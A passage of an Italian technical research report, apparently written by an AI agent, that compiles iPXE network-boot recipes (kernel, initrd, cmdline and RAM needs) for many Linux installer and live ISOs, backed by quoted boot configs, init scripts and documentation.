inutile per Linux; sanboot HTTP raramente utile. Il file completo con note e fonti è in /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/recipes.json (23 ricette); sotto una versione compatta pronta per recipes.json.

### recipes.json compatto (placeholder: {http_iso}=http://{server_ip}/pxe/iso/{slug} senza slash finale; {http_isofile}=http://{server_ip}/pxe/isofile/{slug}.iso; {http_boot}=http://{server_ip}/pxe/boot). Versione estesa con note/fonti: scratchpad/recipes.json

*Fonte:* /tmp/claude-0/-root/a61e104e-c882-489d-9424-4cc40310c811/scratchpad/recipes.json (versione estesa, 23 ricette, note e fonti per ciascuna) — *confidenza:* alta

```
{
 "_ipxe_template": "kernel {http_iso}/<kernel> <cmdline>\ninitrd {http_iso}/<initrd>[ <nome-nel-cpio>]\nboot",
 "_note": "initrd=initrd.magic sempre in cmdline (iPXE UEFI, kernel<5.7; innocuo altrove). Detection case-insensitive sui path della ISO montata.",
 "recipes": [
  {"id":"ubuntu-casper","name":"Ubuntu Desktop/Server >=19.10, Linux Mint, Zorin, elementary, Rescuezilla (casper)",
   "detect":{"kernel_glob":"casper/vmlinuz*","initrd_glob":"casper/initrd*","exclude":["casper_pop-os_*"]},
   "kernel":"casper/vmlinuz (o casper/vmlinuz.efi; Server: anche casper/hwe-vmlinuz)",
   "initrds":["casper/initrd (o initrd.lz / initrd.gz / initrd.lz4; Server HWE: casper/hwe-initrd)"],
   "cmdline":"initrd=initrd.magic boot=casper netboot=url url={http_isofile} ip=dhcp ---",
   "cmdline_alt":"Ubuntu >=22.10: iso-url={http_isofile} (evita conflitto con cloud-init); autoinstall ds=nocloud-net;s=http://... per subiquity",
   "platforms":["bios","efi"],"ram_min_gb":"ISO+1.5 (Server 24.04: >=5, Desktop 24.04: >=8, Mint 22: >=4.5)",
   "notes":"L'URL DEVE finire in .iso (casper: case 'url=*.iso'); intera ISO scaricata in RAM (wget) e montata; uuid check: kernel/initrd dalla stessa ISO"},
  {"id":"popos-casper","name":"Pop!_OS",
   "detect":{"glob":"casper_pop-os_*/vmlinuz.efi"},
   "kernel":"casper_pop-os_<DIR>/vmlinuz.efi","initrds":["casper_pop-os_<DIR>/initrd.gz"],
   "cmdline":"initrd=initrd.magic boot=casper live-media-path=/casper_pop-os_<DIR> netboot=url url={http_isofile} ip=dhcp hostname=pop-os username=pop-os noprompt ---",
   "platforms":["bios","efi"],"ram_min_gb":">=5","notes":"DIR letta da glob/grub.cfg; url=*.iso presunto come Ubuntu (media)"},
  {"id":"debian-live","name":"Debian Live / Kali Live / live-boot generico",
   "detect":{"all":["live/filesystem.squashfs"],"kernel_glob":"live/vmlinuz*","initrd_glob":"live/initrd.img*","exclude":["live/Tails.module","TrueNAS-SCALE.update","Clonezilla-Live-Version","GParted-Live-Version"]},
   "kernel":"live/vmlinuz (fallback live/vmlinuz-<ver>)","initrds":["live/initrd.img (fallback live/initrd.img-<ver>)"],
   "cmdline":"initrd=initrd.magic boot=live components fetch={http_iso}/live/filesystem.squashfs",
   "cmdline_alt":"fetch={http_isofile} (live-boot accetta .iso: wget + loop mount)",
   "platforms":["bios","efi"],"ram_min_gb":"squashfs+1 (Debian standard >=2.5, KDE >=4.5, Kali >=5)"},
  {"id":"gparted-live","name":"GParted Live",
   "detect":{"all":["GParted-Live-Version","live/vmlinuz","live/initrd.img","live/filesystem.squashfs"]},
   "kernel":"live/vmlinuz","initrds":["live/initrd.img"],
   "cmdline":"initrd=initrd.magic boot=live union=overlay username=user config components loglevel=3 noswap net.ifnames=0 nosplash ocs_1_cpu_udev scsi_mod.use_blk_mq=0 nvme.poll_queues=1 ip=dhcp fetch={http_iso}/live/filesystem.squashfs",
   "platforms":["bios","efi"],"ram_min_gb":">=1"},
  {"id":"clonezilla-live","name":"Clonezilla Live",
   "detect":{"all":["Clonezilla-Live-Version","live/vmlinuz","live/initrd.img","live/filesystem.squashfs"]},
   "kernel":"live/vmlinuz","initrds":["live/initrd.img"],
   "cmdline":"initrd=initrd.magic boot=live union=overlay username=user config components loglevel=3 hostname=clonezilla noswap edd=on nomodeset enforcing=0 noeject locales= keyboard-layouts= ocs_live_run=\"ocs-live-general\" ocs_live_extra_param=\"\" ocs_live_batch=\"no\" vga=788 net.ifnames=0 quiet nosplash i915.blacklist=yes radeonhd.blacklist=yes nouveau.blacklist=yes vmwgfx.enable_fbdev=1 ocs_1_cpu_udev scsi_mod.use_blk_mq=0 nvme.poll_queues=1 ip=dhcp fetch={http_iso}/live/filesystem.squashfs",
   "platforms":["bios","efi"],"ram_min_gb":">=1.5","notes":"locales=it_IT.UTF-8 keyboard-layouts=it opzionali; live-netdev=<if> per forzare l'interfaccia"},
  {"id":"debian-installer","name":"Debian installer netinst/DVD (d-i) e Ubuntu legacy d-i",
   "detect":{"any":["install.amd/vmlinuz","install/vmlinuz"]},
   "kernel":"install.amd/vmlinuz","initrds":["install.amd/initrd.gz (grafico: install.amd/gtk/initrd.gz)"],
   "cmdline":"initrd=initrd.magic vga=788 --- quiet",
   "cmdline_alt":"auto=true priority=critical url=http://{server_ip}/pxe/preseed/{slug}.cfg interface=auto (max 32 opzioni kernel)",
   "platforms":["bios","efi"],"ram_min_gb":">=0.5 text / >=1 gtk","notes":"initrd 'cdrom': cdrom-detect fallisce e si passa al mirror di rete; per netboot puro usare netboot/debian-installer/amd64/initrd.gz dal mirror"},
  {"id":"fedora-live","name":"Fedora Workstation/Spins Live",
   "detect":{"all":["LiveOS/squashfs.img"],"kernel_any":["boot/x86_64/loader/linux","images/pxeboot/vmlinuz"],"initrd_any":["boot/x86_64/loader/initrd","images/pxeboot/initrd.img"],"distinguish":"EFI/fedora/ presente (openSUSE live: EFI/BOOT/MokManager.efi, grub.cfg 'openSUSE')"},
   "kernel":"boot/x86_64/loader/linux (F42+/44 kiwi) | images/pxeboot/vmlinuz (vecchie)","initrds":["boot/x86_64/loader/initrd | images/pxeboot/initrd.img"],
   "cmdline":"initrd=initrd.magic root=live:{http_iso}/LiveOS/squashfs.img rd.live.image ip=dhcp rd.neednet=1 quiet rhgb",
   "cmdline_alt":"root=live:{http_isofile} (livenet fa losetup delle .iso)",
   "platforms":["bios","efi"],"ram_min_gb":">=4 (squashfs F44 2.5 GB in RAM), meglio 6-8"},
  {"id":"anaconda-installer","name":"Fedora/RHEL/Rocky/Alma/CentOS Stream installer",
   "detect":{"all":["images/pxeboot/vmlinuz","images/pxeboot/initrd.img","images/install.img"],"optional":[".treeinfo","BaseOS/"]},
   "kernel":"images/pxeboot/vmlinuz","initrds":["images/pxeboot/initrd.img"],
   "cmdline":"initrd=initrd.magic inst.stage2={http_iso} inst.repo={http_iso} ip=dhcp",
   "cmdline_alt":"boot ISO (senza .treeinfo/repo): solo inst.stage2={http_iso} (fallback images/install.img) + eventuale inst.repo=<mirror>; inst.ks=..., inst.text",
   "platforms":["bios","efi"],"ram_min_gb":">=2 (install.img 1.26 GB in RAM), GUI 3-4"},
  {"id":"archiso","name":"Arch Linux e derivate archiso (EndeavourOS, BlackArch...)",
   "detect":{"all":["arch/boot/x86_64/vmlinuz-linux","arch/boot/x86_64/initramfs-linux.img","arch/x86_64/airootfs.sfs"]},
   "kernel":"arch/boot/x86_64/vmlinuz-linux","initrds":["arch/boot/intel-ucode.img (se esiste)","arch/boot/amd-ucode.img (se esiste)","arch/boot/x86_64/initramfs-linux.img"],
   "cmdline":"initrd=initrd.magic archisobasedir=arch archiso_http_srv={http_iso}/ ip=dhcp net.ifnames=0 BOOTIF=01-${netX/mac}",
   "platforms":["bios","efi"],"ram_min_gb":">=2.5 (airootfs 1.07 GB in tmpfs); EndeavourOS (3.35 GB) >=6","notes":"archiso_http_srv deve finire con /; Arch 2026.09 non ha ucode separati; Manjaro (miso*) NON compatibile"},
  {"id":"systemrescue","name":"SystemRescue >=6",
   "detect":{"all":["sysresccd/boot/x86_64/vmlinuz","sysresccd/boot/x86_64/sysresccd.img","sysresccd/x86_64/airootfs.sfs"]},
   "kernel":"sysresccd/boot/x86_64/vmlinuz","initrds":["sysresccd/boot/intel_ucode.img","sysresccd/boot/amd_ucode.img","sysresccd/boot/x86_64/sysresccd.img"],
   "cmdline":"initrd=initrd.magic archisobasedir=sysresccd archiso_http_srv={http_iso}/ ip=dhcp iomem=relaxed checksum",
   "platforms":["bios","efi"],"ram_min_gb":">=2 (airootfs 1.15 GB)","notes":"opzioni: rootpass=, nofirewall, setkmap=it, dostartx, copytoram"},
  {"id":"opensuse-installer","name":"openSUSE Leap/Tumbleweed installer, SLES",
   "detect":{"all":["boot/x86_64/loader/linux","boot/x86_64/loader/initrd"],"and_any":["media.1/media",".treeinfo"]},
   "kernel":"boot/x86_64/loader/linux","initrds":["boot/x86_64/loader/initrd"],
   "cmdline":"initrd=initrd.magic install={http_iso}/ netsetup=dhcp splash=silent showopts",
   "cmdline_alt":"NET ISO: install=http://download.opensuse.org/distribution/leap/15.6/repo/oss/ ; textmode=1 ; autoyast=http://... ; self_update=0",
   "platforms":["bios","efi"],"ram_min_gb":">=1.5-2"},
  {"id":"opensuse-live","name":"openSUSE Live (kiwi)",
   "detect":{"all":["boot/x86_64/loader/linux","boot/x86_64/loader/initrd","LiveOS/squashfs.img","EFI/BOOT/MokManager.efi"]},
   "kernel":"boot/x86_64/loader/linux","initrds":["boot/x86_64/loader/initrd"],
   "cmdline":"initrd=initrd.magic root=live:{http_isofile} rd.live.image ip=dhcp splash=silent quiet systemd.show_status=yes",
   "platforms":["bios","efi"],"ram_min_gb":">=3 (ISO intera in ramdisk; ramdisk_size default 2 GiB -> ramdisk_size=<kB> se ISO >2 GB)"},
  {"id":"alpine","name":"Alpine Linux standard/extended",
   "detect":{"all":["boot/vmlinuz-lts","boot/initramfs-lts","boot/modloop-lts"]},
   "kernel":"boot/vmlinuz-lts","initrds":["boot/initramfs-lts"],
   "cmdline":"initrd=initrd.magic modules=loop,squashfs,sd-mod,usb-storage quiet ip=dhcp modloop={http_iso}/boot/modloop-lts alpine_repo={http_iso}/apks",
   "cmdline_alt":"alpine_repo=http://dl-cdn.alpinelinux.org/alpine/v3.24/main ; apkovl=http://.../{MAC}.apkovl.tar.gz ; rootflags=size=350M se RAM<700MB",
   "platforms":["bios","efi"],"ram_min_gb":">=1 (modloop 307 MB via wget)"},
  {"id":"proxmox-ve","name":"Proxmox VE installer 8.x/9.x",
   "detect":{"all":["boot/linux26","boot/initrd.img","pve-installer.squashfs"]},
   "kernel":"boot/linux26","initrds":["boot/initrd.img","{http_isofile} proxmox.iso"],
   "cmdline":"initrd=initrd.magic ro ramdisk_size=16777216 rw quiet splash=silent",
   "cmdline_alt":"proxtui | nomodeset | proxdebug | proxmox-start-auto-installer",
   "platforms":["bios","efi"],"ram_min_gb":">=4 (initrd 360 MB + ISO 1.6 GB in RAM)","notes":"l'init cerca /proxmox.iso nell'initramfs ('useful for PXE boot'): iPXE 'initrd {http_isofile} proxmox.iso'"},
  {"id":"truenas-scale","name":"TrueNAS SCALE/CE installer (sperimentale)",
   "detect":{"all":["vmlinuz","initrd.img","live/filesystem.squashfs","TrueNAS-SCALE.update"]},
   "kernel":"vmlinuz","initrds":["initrd.img"],
   "cmdline":"initrd=initrd.magic boot=live ip=dhcp fetch={http_isofile} gfxpayload=text quiet nomodeset console=tty0",
   "platforms":["bios","efi"],"ram_min_gb":">=8","notes":"installer parte ma può non trovare /cdrom/TrueNAS-SCALE.update (workaround manuale nel forum); nessun supporto ufficiale PXE"},
  {"id":"esxi","name":"VMware ESXi installer (solo UEFI)",
   "detect":{"all_ci":["mboot.c32","boot.cfg","efi/boot/bootx64.efi"]},
   "kernel":"{http_boot}/esxi/{slug}/mboot.efi (= efi/boot/bootx64.efi della ISO rinominato)","initrds":[],
   "cmdline":"-c {http_boot}/esxi/{slug}/boot.cfg",
   "boot_cfg":"copia di boot.cfg con: prefix={http_iso} ; rimuovere '/' iniziale in kernel= e modules= ; rimuovere 'cdromBoot' da kernelopt= ; opz. kernelopt=ks=http://.../ks.cfg",
   "platforms":["efi"],"ram_min_gb":">=8","notes":"BIOS richiede pxelinux 3.86 + mboot.c32: non supportato da iPXE puro"},
  {"id":"memtest86plus","name":"Memtest86+ 7.20 (pacchetto Debian)",
   "detect":{"local":true},
   "kernel":"bios: {http_boot}/memtest86+x64.bin (da /boot/) ; efi: chain {http_boot}/memtest86+x64.efi","initrds":[],"cmdline":"",
   "platforms":["bios","efi"],"notes":"iseq ${platform} efi && chain .../memtest86+x64.efi || kernel .../memtest86+x64.bin ; ISO ibride in /usr/lib/memtest86+/"},
  {"id":"freedos","name":"FreeDOS (memdisk)","detect":{"hint_ci":["FDSETUP/","kernel.sys"]},"kernel":"{http_boot}/memdisk","initrds":["{http_isofile}"],"cmdline":"iso raw","platforms":["bios"],"ram_min_gb":">=1"},
  {"id":"tails","name":"Tails - NON supportato","detect":{"all":["live/Tails.module"]},"kernel":"live/vmlinuz","initrds":["live/initrd.img"],"cmdline":"(non funziona: initrd senza rete, PXE rifiutato upstream)","platforms":[]},
  {"id":"generic-memdisk","name":"Fallback BIOS memdisk","detect":{"fallback":"ISO < 2 GB"},"kernel":"{http_boot}/memdisk","initrds":["{http_isofile}"],"cmdline":"iso raw","platforms":["bios"],"ram_min_gb":"ISO + SO","notes":"memdisk 32-bit: max ~2 GB; Linux non vede il CD dopo il kernel -> solo DOS/tool"},
  {"id":"generic-sanboot","name":"Fallback sanboot HTTP","detect":{"fallback":true},"ipxe":"sanboot --no-describe --drive 0x80 {http_isofile}  (BIOS) | sanboot {http_isofile} (UEFI, serve ESP nella ISO)","platforms":["bios","efi"],"notes":"El Torito no-emulation only; drive sparisce dopo il kernel -> raramente utile; avviso in GUI"},
  {"id":"ventoy","name":"Ventoy/iVentoy","detect":{"hint":"ventoy/ventoy.dat"},"platforms":[],"notes":"non applicabile (installer USB); iVentoy è un server PXE separato concatenabile"}
 ]
}
```

### casper (Ubuntu/Mint/Zorin/Rescuezilla): url= DEVE terminare in .iso, ip=dhcp obbligatorio

*Fonte:* https://git.launchpad.net/ubuntu/+source/casper/plain/scripts/casper?h=ubuntu/noble ; https://git.launchpad.net/ubuntu/+source/casper/plain/debian/changelog?h=ubuntu/noble ; https://discourse.ubuntu.com/t/netbooting-the-live-server-installer/14510 ; ISO ubuntu-24.04.4-live-server, linuxmint-22-cinnamon, rescuezilla-2.6.2, pop-os_24.04 — *confidenza:* alta

```
scripts/casper (ubuntu/noble, jammy, focal):
            url=*.iso)
                export NETBOOT=url
                export URL="${x#url=}" ;;
            iso-url=*.iso)
                export NETBOOT=url
                export URL="${x#iso-url=}" ;;
...
do_urlmount() {
    modprobe "${MP_QUIET}" isofs
    target=$(basename "${URL}")
    if wget "${URL}" -O "${target}"; then
        if mount -o ro "${target}" "${mountpoint}"; then
            if is_casper_path $mountpoint && matches_uuid $mountpoint; then rc=0

changelog: casper (1.434) focal: 'Only netboot with url=*.iso too'; casper (1.472) kinetic: 'Support iso-url= on the kernel command line as a synonym for url=, to help avoid the conflict with cloud-init'.
Grub ISO Ubuntu Server 24.04.4: 'linux /casper/vmlinuz ---' + 'initrd /casper/initrd' (anche hwe-vmlinuz/hwe-initrd). Mint 22: '/casper/vmlinuz boot=casper username=mint hostname=mint' + '/casper/initrd.lz'. Rescuezilla 2.6.2: /casper/vmlinuz + /casper/initrd.lz. Pop!_OS 24.04: '/casper_pop-os_24.04_amd64_intel_debug_377/vmlinuz.efi boot=casper live-media-path=/casper_pop-os_... hostname=pop-os username=pop-os noprompt ---' + initrd.gz.
```

### live-boot (Debian/Kali/Clonezilla/GParted): fetch= accetta .squashfs o .iso, va in RAM

*Fonte:* pacchetto live-boot_20250815~deb13u1_all.deb (deb.debian.org) ; https://manpages.debian.org/trixie/live-boot-doc/live-boot.7.en.html ; https://ipxe.org/appnote/debian_live ; ISO debian-live-13.6.0-amd64-standard — *confidenza:* alta

```
/usr/lib/live/boot/9990-mount-http.sh (live-boot 20250815~deb13u1):
			case "${extension}" in
				iso|squashfs|tgz|tar)
					if [ "${extension}" = "iso" ]; then mkdir -p "${alt_mountpoint}"; dest="${alt_mountpoint}"
					else dest="${mountpoint}/${LIVE_MEDIA_PATH}"; mount -t ramfs ram "${mountpoint}" ...
					if [ "${webfile}" = "FETCH" ]; then ... wget "${url}" -O "${dest}/$(basename ${url})"
					...
					if [ "${extension}" = "iso" ]; then isoloop=$(setup_loop ...); mount -t iso9660 "${isoloop}" "${mountpoint}"
live-boot(7): 'fetch=URL ... The fetch method copies the image to RAM and the httpfs method uses FUSE and httpfs2 to mount the image in place.'
Debian live 13.6 grub.cfg: 'linux /live/vmlinuz-6.12.94+deb13-amd64 boot=live components quiet splash findiso=${iso_path}' (esistono anche /live/vmlinuz e /live/initrd.img non versionati).
ipxe.org appnote debian_live: 'imgargs vmlinuz boot=live config hooks=filesystem username=live noeject fetch=http://.../live/filesystem.squashfs'
```

### Clonezilla 3.3.3-15 e GParted 1.8.1-3: append reali dal syslinux.cfg della ISO

*Fonte:* ISO da https://free.nchc.org.tw/clonezilla-live/stable/ e https://free.nchc.org.tw/gparted-live/stable/ ; https://gparted.org/livepxe.php (clonezilla.org irraggiungibile: ECONNREFUSED) — *confidenza:* alta

```
clonezilla-live-3.3.3-15-amd64.iso /syslinux/syslinux.cfg:
label Clonezilla live
  kernel /live/vmlinuz
  append initrd=/live/initrd.img boot=live union=overlay username=user config components loglevel=3 hostname=cl-3.3.3-15 noswap edd=on nomodeset enforcing=0 noeject locales= keyboard-layouts= ocs_live_run="ocs-live-general" ocs_live_extra_param="" ocs_live_batch="no" vga=788 net.ifnames=0 quiet nosplash i915.blacklist=yes radeonhd.blacklist=yes nouveau.blacklist=yes vmwgfx.enable_fbdev=1 ocs_1_cpu_udev scsi_mod.use_blk_mq=0 nvme.poll_queues=1

gparted-live-1.8.1-3-amd64.iso /syslinux/syslinux.cfg:
label GParted Live
  kernel /live/vmlinuz
  append initrd=/live/initrd.img boot=live union=overlay username=user config components loglevel=3 noswap  net.ifnames=0  nosplash  ocs_1_cpu_udev scsi_mod.use_blk_mq=0 nvme.poll_queues=1

gparted.org/livepxe.php: 'append initrd=initrd.img boot=live config components union=overlay username=user noswap noeject vga=788 fetch=http://$webserverIP/filesystem.squashfs'
Marker di rilevamento: /Clonezilla-Live-Version e /live/Clonezilla-Live-Version ; /GParted-Live-Version e /live/GParted-Live-Version (entrambe le ISO hanno .disk/info identico 'Debian GNU/Linux none "Sid" - Snapshot amd64 LIVE Binary').
```

### Debian installer netinst 13.6: layout e cmdline; preseed

*Fonte:* ISO debian-13.6.0-amd64-netinst ; https://deb.debian.org/debian/dists/trixie/main/installer-amd64/current/images/MANIFEST ; https://www.debian.org/releases/stable/amd64/apbs02.en.html ; https://ipxe.org/appnote/debian_preseed — *confidenza:* alta

```
debian-13.6.0-amd64-netinst.iso: /install.amd/vmlinuz (12 MB), /install.amd/initrd.gz (24 MB), /install.amd/gtk/initrd.gz (66 MB), /install.amd/xen/
isolinux/txt.cfg:
label install
	kernel /install.amd/vmlinuz
	append vga=788 initrd=/install.amd/initrd.gz --- quiet
boot/grub/grub.cfg: linux /install.amd/vmlinuz vga=788 --- quiet ; initrd /install.amd/gtk/initrd.gz
MANIFEST d-i: 'cdrom/initrd.gz -- initrd for use with isolinux to build a CD' (l'initrd netboot è netboot/debian-installer/amd64/initrd.gz).
Guida Debian B.2.2: url = alias di preseed/url; auto=true priority=critical; 'Current linux kernels (2.6.9 and later) accept a maximum of 32 command line options and 32 environment options'.
ipxe.org debian_preseed (EFI): 'kernel debian/linux initrd=one.gz initrd=two <other args>' + 'initrd --name one.gz debian/initrd.gz' + 'initrd --name two debian/preseed.cfg preseed.cfg' ('EFI linux requires the initrd(s) to be passed on the command line').
```

### Fedora live (dracut livenet) e installer anaconda (inst.stage2/.treeinfo)

*Fonte:* ISO Fedora-Workstation-Live-44-1.7.x86_64 ; https://raw.githubusercontent.com/dracutdevs/dracut/master/modules.d/90livenet/ ; https://man7.org/linux/man-pages/man7/dracut.cmdline.7.html ; https://anaconda-installer.readthedocs.io/en/latest/user-guide/boot-options.html ; https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/9/html/automatically_installing_rhel/custom-boot-options_rhel-installer ; ISO AlmaLinux-9-latest-x86_64-boot — *confidenza:* alta

```
Fedora-Workstation-Live-44-1.7 (build kiwi): /boot/x86_64/loader/linux, /boot/x86_64/loader/initrd (275 MB), /LiveOS/squashfs.img (2.49 GB); NESSUN images/pxeboot. grub.cfg: 'linux ($root)/boot/x86_64/loader/linux quiet rhgb root=live:CDLABEL=Fedora-WS-Live-44 rd.live.image'.
dracut parse-livenet.sh: str_starts "$root" "live:" && liveurl="$root" ... netroot="livenet:$liveurl"
livenetroot.sh: imgfile=$(fetch_url "$liveurl") ... if [ "${imgfile##*.}" = "iso" ]; then root=$(losetup -f); losetup "$root" "$imgfile" ...; exec /sbin/dmsquash-live-root "$root"
dracut.cmdline(7): root=live:<url> handler http, https, ftp, torrent, tftp; rd.live.image; rd.live.dir (default /LiveOS); rd.live.squashimg (default squashfs.img); rd.live.ram=1.
Anaconda docs: 'inst.stage2 ... This specifies the location to fetch only the installer runtime image; packages will be ignored. Otherwise the same as inst.repo' ; 'an installable tree must contain a valid .treeinfo file for inst.repo or inst.stage2 to work'.
RHEL9 docs: 'If the .treeinfo file is not available, the installation program attempts to load the image from images/install.img.' inst.repo=http:// -> 'Installation tree' (ISO via http non elencata; ISO solo con hd:/nfs:).
AlmaLinux-9-latest-boot.iso: /images/pxeboot/{vmlinuz,initrd.img}, /images/install.img (1.26 GB), /.discinfo, NESSUN .treeinfo; EFI/BOOT/grub.cfg: 'linuxefi /images/pxeboot/vmlinuz inst.stage2=hd:LABEL=AlmaLinux-9-8-x86_64-dvd quiet'.
```

### Arch / SystemRescue: parametri HTTP dai cfg PXE delle ISO e dallo script iPXE ufficiale

*Fonte:* ISO archlinux-x86_64.iso (geo.mirror.pkgbuild.com) ; https://archlinux.org/releng/netboot/archlinux.ipxe ; https://raw.githubusercontent.com/rcrowley/archiso/master/docs/README.bootparams ; ISO systemrescue-13.02-amd64 ; https://www.system-rescue.org/manual/PXE_network_booting/ ; https://www.system-rescue.org/manual/Boot_options/ — *confidenza:* alta

```
archlinux-x86_64 2026.09.01 /boot/syslinux/archiso_pxe-linux.cfg:
LABEL arch_http
LINUX ::/arch/boot/x86_64/vmlinuz-linux
INITRD ::/arch/boot/x86_64/initramfs-linux.img
APPEND archisobasedir=arch archiso_http_srv=http://${pxeserver}/ cms_verify=y
SYSAPPEND 3
(nessun intel-ucode.img/amd-ucode.img nella ISO 2026.09)
archlinux.org/releng/netboot/archlinux.ipxe: kernel ${mirrorurl}iso/${release}/arch/boot/x86_64/vmlinuz-linux ; initrd .../arch/boot/x86_64/initramfs-linux.img ; imgargs vmlinuz-linux initrd=initramfs-linux.img archiso_http_srv=${mirrorurl}iso/${release}/ archisobasedir=arch cms_verify=y ip=dhcp net.ifnames=0 BOOTIF=01-${netX/mac}
README.bootparams: archiso_http_srv= 'Set an HTTP URL (must end with /) where ${archisobasedir} is found with all *.sfs files.'

systemrescue-13.02 /sysresccd/boot/syslinux/sysresccd_pxe.cfg:
LABEL sysresccd_http
LINUX boot/x86_64/vmlinuz
INITRD boot/intel_ucode.img,boot/amd_ucode.img,boot/x86_64/sysresccd.img
APPEND archisobasedir=sysresccd archiso_http_srv=http://${pxeserver}/ iomem=relaxed
SYSAPPEND 3
Manuale: 'APPEND archisobasedir=sysresccd ip=dhcp archiso_http_srv=http://10.0.2.4/ checksum' ; copytoram 'requires 2GB of memory'.
```

### openSUSE: installer linuxrc (Leap 15.6 NET verificata) e Live kiwi

*Fonte:* ISO openSUSE-Leap-15.6-NET-x86_64-Media ; https://documentation.suse.com/sles/15-SP6/html/SLES-all/cha-boot-parameters.html ; https://osinside.github.io/kiwi/working_with_images/network_live_iso_boot.html ; ISO openSUSE-Tumbleweed-GNOME-Live-x86_64-Current — *confidenza:* media

```
openSUSE-Leap-15.6-NET-x86_64-Media.iso: /boot/x86_64/loader/linux (14 MB), /boot/x86_64/loader/initrd (237 MB), /media.1/media, /.treeinfo, /x86_64/ (solo release rpm).
loader/isolinux.cfg: label linux / kernel linux / append initrd=initrd splash=silent showopts ; EFI/BOOT/grub.cfg: linux /boot/x86_64/loader/linux splash=silent ; initrd /boot/x86_64/loader/initrd
SLES 15 SP6 boot parameters: install= protocolli 'cd, hd, slp, nfs, smb, ftp, tftp, http, https'; es. 'install=https://USER:PASSWORD@SERVER/DIRECTORY/DVD1/'; 'netsetup=dhcp forces a configuration via DHCP'; hostip=, autoyast=URL, textmode=1, self_update=.
KIWI docs (Tumbleweed Live): 'append initrd=boot/initrd ip=dhcp root=live:ftp://IP/image/<img>.iso' (ftp, http, https, dolly); 'places the ISO file into a ramdisk'; ramdisk_size default 2097152 kB.
Tumbleweed GNOME Live grub.cfg: 'linux ($root)/boot/x86_64/loader/linux ... root=live:CDLABEL=openSUSE_Tumbleweed_GNOME_Live rd.live.image rd.live.overlay.persistent rd.live.overlay.cowfs=ext4' ; ISO 1.27 GB, LiveOS/squashfs.img 1.1 GB.
```

### Alpine 3.24.1: cmdline ISO, script iPXE ufficiale, modloop via HTTP

*Fonte:* ISO alpine-standard-3.24.1-x86_64 ; https://boot.alpinelinux.org/boot.ipxe ; https://raw.githubusercontent.com/alpinelinux/mkinitfs/master/initramfs-init.in ; https://raw.githubusercontent.com/alpinelinux/aports/master/main/openrc/modloop.initd — *confidenza:* alta

```
alpine-standard-3.24.1 /boot/syslinux/syslinux.cfg:
LABEL lts
KERNEL /boot/vmlinuz-lts
INITRD /boot/initramfs-lts
APPEND modules=loop,squashfs,sd-mod,usb-storage quiet
File: /boot/modloop-lts (307 MB), /apks/x86_64/APKINDEX.tar.gz, /apks/.boot_repository
boot.alpinelinux.org/boot.ipxe: kernel ${img-url}/vmlinuz-${flavor} ${cmdline} alpine_repo=${repo-url} modloop=${modloop-url} ${console} ; initrd ${img-url}/initramfs-${flavor}  (cmdline='modules=loop,squashfs quiet nomodeset')
mkinitfs initramfs-init.in: '#   alpine_repo=http://...   -- network repository' ; rete attivata se KOPT_ip o alpine_repo/apkovl sono URL (default ip=dhcp).
aports main/openrc/modloop.initd: case "$KOPT_modloop" in http://*|https://*|ftp://*) modloop=/lib/${KOPT_modloop##*/}; wget -P /lib "$KOPT_modloop" ... mount -o loop,ro $modloop /.modloop
```

### Proxmox VE 9.2: fattibile con ISO iniettata come /proxmox.iso nell'initrd

*Fonte:* initrd estratto (range HTTP) da https://enterprise.proxmox.com/iso/proxmox-ve_9.2-1.iso ; https://github.com/morph027/pve-iso-2-pxe ; https://pve.proxmox.com/wiki/Automated_Installation ; https://forum.proxmox.com/threads/automated-installation-pxe-boot.169009/ — *confidenza:* alta

```
proxmox-ve_9.2-1.iso: /boot/linux26 (16 MB), /boot/initrd.img (56 MB zstd -> 360 MB), /pve-installer.squashfs, /pve-base.squashfs, /.pve-cd-id.txt, /auto-installer-capable
grub.cfg: linux /boot/linux26 ro ramdisk_size=16777216 rw quiet splash=silent  (+ proxtui | nomodeset | proxdebug | proxmox-start-auto-installer)
/init dell'initrd (riga ~288):
    initrdisoimage="/proxmox.iso"
    if [ -f $initrdisoimage ]; then
        # this is useful for PXE boot
        echo "found proxmox ISO image inside initrd image"
        if mount -t iso9660 -o loop,ro $initrdisoimage /mnt >/dev/null 2>&1; then cdrom=$initrdisoimage
-> iPXE: initrd {http_iso}/boot/initrd.img ; initrd {http_isofile} proxmox.iso  (equivale a pve-iso-2-pxe: 'echo "../proxmox.iso" | cpio -L -H newc -o >> initrd').
Wiki Proxmox Automated_Installation: 'Instead of writing the prepared ISO to a physical medium, you can boot the automatic installer over the network via PXE' via proxmox-auto-install-assistant prepare-iso ... --pxe --output <dir> (--pxe-loader ipxe). Forum 169009 iPXE: 'kernel .../vmlinuz initrd=initrd.img ramdisk_size=16777216 rw quiet splash=silent proxmox-start-auto-installer'.
```

### ESXi (mboot.efi, solo UEFI), TrueNAS (sperimentale), Tails (no)

*Fonte:* https://techdocs.broadcom.com/us/en/vmware-cis/vsphere/vsphere/8-0/esx-installation-and-setup/installing-and-setting-up-esxi-install/installing-esxi-install/how-to-boot-an-esxi-host-from-a-network-device-install/boot-the-esxi-installer-by-using-ipxe-and-http-install.html ; https://forums.truenas.com/t/boot-into-truenas-installer-via-ipxe/30138 ; ISO TrueNAS-SCALE-25.10.7 ; ISO tails-amd64-7.12 ; https://public-redmine-archive.tails.boum.org/code/issues/11044/ ; https://forums.fogproject.org/topic/17190/ — *confidenza:* media

```
Broadcom ESXi 8.0 'Boot the ESXi Installer by Using iPXE and HTTP': UEFI -> 'Copy the efi/boot/bootx64.efi file from the ESXi installer ISO image ... rename the file to mboot.efi'; boot.cfg: 'prefix=http://XXX.XXX.XXX.XXX/ESXi-8.x.x-XXXXXX'; 'If the filenames in the kernel= and modules= lines begin with a forward slash (/) character, delete that character'; 'If the kernelopt= line contains the string cdromBoot, remove the string only'; scripted: kernelopt=ks=http://.../ks.cfg. BIOS: 'KERNEL ESXi-7.x.x-XXXXXX/mboot.c32 / APPEND -c ESXi-7.x.x-XXXXXX/boot.cfg' con pxelinux 3.86 (non iPXE). iPXE UEFI: kernel .../mboot.efi -c .../boot.cfg (sintassi consolidata, non riportata testualmente nella pagina).

